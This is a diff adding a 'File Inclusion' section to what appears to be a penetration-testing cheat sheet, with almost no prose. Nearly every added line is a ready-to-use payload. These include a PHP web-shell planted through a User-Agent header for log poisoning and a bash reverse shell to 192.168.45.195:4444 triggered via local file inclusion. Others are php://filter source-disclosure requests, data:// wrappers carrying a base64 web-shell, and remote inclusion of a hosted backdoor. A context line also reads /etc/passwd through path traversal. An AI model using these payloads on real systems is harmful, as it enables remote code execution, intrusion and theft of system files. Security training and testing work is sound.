@@ -132,6 +132,50 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 ## File Inclusion
 
+### LFI
+
+#### User-Agent
+
+```
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+```
+
+#### reverse shell by GET parameter
+
+```
+nc -lvnp 4444
+
+bash -c "bash -i >& /dev/tcp/192.168.45.195/4444 0>&1"
+
+index.php?page=../../../../../../var/log/apache2/access.log&cmd=bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E45%2E195%2F4444%200%3E%261%22
+```
+
+### PHP Wrapper
+
+#### php://filter
+
+```
+index.php?page=php://filter/resource=admin.php
+
+index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
+```
+
+#### data://
+
+```
+index.php?page=data://text/plain,<?php%20echo%20system($_GET["cmd"]);?>
+
+index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
+```
+
+### RFI
+
+```
+python3 -m http.server 80
+
+index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls
+```
+
 ## File Upload
 
 ## Command Injection
